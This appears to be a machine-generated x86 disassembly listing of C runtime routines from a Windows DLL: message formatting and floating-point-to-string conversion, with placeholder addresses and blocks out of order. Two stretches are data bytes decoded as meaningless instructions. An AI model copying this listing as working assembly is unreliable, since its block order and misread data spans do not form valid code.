call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xb
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x12
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x10
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
sub eax 0x48c
je r-xdata
lea eax [ esi - 0x3e3 ]
cmp eax 0x11
ja r-xdata
sub eax 0x3
jne r-xdata
movzx ecx [ eax + lookup_table_10023230 ]
jmp [ ecx * 4 + jump_table_10023220 ]
call sub_10022ba0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c7
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
sub_1002315a
adc [ edi + eax ] eax
or [ ecx ] edx
adc [ ecx ] edx
or dl [ ecx ]
adc [ ecx ] edx
or cl [ edx ]
adc [ ebx + ecx ] eax
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx + edx ] ecx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
pop es
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or eax 0x11110411
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ edx ] ecx
push cs
or al 0x11
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ 0x11111111 ] eax
adc [ ecx ] edx
adc [ 0x11111111 ] eax
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
movups [ ecx ] xmm2
adc [ ecx ] dl
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ edi ] ecx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or eax 0x11111111
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or ecx [ ebp + 0x2de20049 ]
add dl [ eax ]
add dl [ cs : eax ]
0x22d
sub_100232df
or cl [ ebx ]
or al 0xd
push ds
push cs
push ds
movups xmm2 [ ecx ]
adc dl [ ebx ]
adc al 0x15
push ss
pop ss
sbb [ ecx ] bl
push ds
push ds
sbb bl [ ebx ]
push ds
sbb al 0x1e
sbb eax 0xcccccccc
int3
sub_10023300
push 0xffffffff
push sub_10026a40
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0xc ] ebx
test [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0x40 ]
push eax
call sub_10023650
add esp 0x4
test eax eax
je r-xdata
mov eax 0x1
or [ rw-data ] eax
push 0xd
push r--data
mov ecx rw-data
mov [ esp + 0x3c ] eax
mov [ rw-data ] 0xf
mov [ rw-data ] ebx
mov [ rw-data ] bl
call sub_10001bc6
push sub_100286e0
call sub_1001457c
add esp 0x4
mov [ esp + 0x34 ] bl
mov eax rw-data
mov ecx eax
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
lea esi [ ecx + 0x1 ]
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x2c
retn 0x8
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_10001bc6
mov ebx 0x1
lea eax [ esp + 0x10 ]
mov [ esp + 0x34 ] 0x2
mov [ esp + 0xc ] ebx
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_10010ba2
add esp 0x4
mov esi [ esp + 0x3c ]
push 0xffffffff
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push eax
mov ecx esi
mov [ esi + 0x4 ] 0x0
call sub_100018cc
or ebx 0x2
test bl 0x1
je r-xdata
sub_10023430
push 0xffffffff
push sub_10026a89
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x44 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x58 ]
mov edi [ esp + 0x54 ]
xor ebx ebx
push ebx
push ebx
lea eax [ esp + 0x1c ]
push eax
push 0x400
push ecx
push ebx
mov [ esp + 0x30 ] ebx
push 0x1300
mov [ esp + 0x38 ] edi
mov [ esp + 0x30 ] ebx
call [ FormatMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov ebp ecx
mov [ esp + 0x20 ] ebp
mov esi 0x1
mov [ esp + 0x4c ] esi
cmp eax ebx
jne r-xdata
mov eax ecx
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] bl
lea esi [ eax + 0x1 ]
push 0xd
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] ebx
push r--data
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_10001bc6
mov [ esp + 0x18 ] esi
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ esp + 0x2c ]
call sub_10001bc6
mov eax [ esp + 0x38 ]
mov [ esp + 0x4c ] 0x2
cmp eax ebx
je r-xdata
push ebp
mov [ esp + 0x50 ] bl
call [ LocalFree@IAT ]
mov eax edi
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_10010789
add esp 0x3c
retn 0x8
push 0xffffffff
push ebx
lea edx [ esp + 0x2c ]
mov esi 0xf
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ebx
push edx
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_100018cc
cmp [ esp + 0x3c ] 0x10
mov [ esp + 0x18 ] 0x1
jb r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] bl
mov eax [ esp + 0x28 ]
push eax
call sub_10010ba2
add esp 0x4
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_10010b92
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0xa
je r-xdata
lea ecx [ esp + 0x28 ]
push 0xffffffff
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_10001c38
mov eax [ esp + 0x38 ]
cmp eax ebx
jne r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
jmp r-xdata
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_10010b92
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0xd
jne r-xdata
lea ecx [ esp + 0x28 ]
cmp eax ebx
je r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_10010b92
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0x2e
jne r-xdata
lea ecx [ esp + 0x28 ]
push 0xffffffff
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_10001c38
sub_10023628
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
call sub_100236bc
mov esi [ eax ]
call sub_100236bc
cmp esi [ eax ]
jl r-xdata
call sub_100236c2
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_10023650
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_10017ba3
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_10023628
push eax
push edi
push esi
call sub_100178e5
add esp 0x10
test eax eax
je r-xdata
push 0x1
push edi
call sub_100166ee
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
mov eax r--data
jmp r-xdata
pop edi
sub_1002374b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1002284a
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1001398e
test eax eax
movsx eax [ esi ]
push eax
call sub_1002284a
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100237be
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10023840
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1002385c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10024395
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_100242ed
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_100238b8
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10010990
inc eax
push eax
push esi
add esi edi
push esi
call sub_10017580
add esp 0x10
sub_100238fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100137b8
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_100167f3
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_100167f3
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_100238b8
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
push r--data
push ebx
push esi
call sub_100178e5
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10017580
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_10023a6c
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_100245b9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_100238fd
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_1002443d
add esp 0x10
cmp eax ebx
je r-xdata
sub_10023b3c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023a6c
add esp 0x18
pop ebp
retn
sub_10023b5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_100137b8
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_100167f3
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_100167f3
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10023b3c
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_100242c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10024730
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10024730
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10011a90
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_10024730
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10024650
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10024650
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10024650
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10023ecf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_100137b8
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_100238b8
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_100238b8
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_100238b8
push edi
push 0x30
push esi
call sub_10011a90
add esp 0xc
sub_10023fc6
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_100245b9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_10023ecf
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1002443d
add esp 0x10
cmp eax ebx
je r-xdata
sub_10024081
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_100245b9
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_10010b6c
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1002443d
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
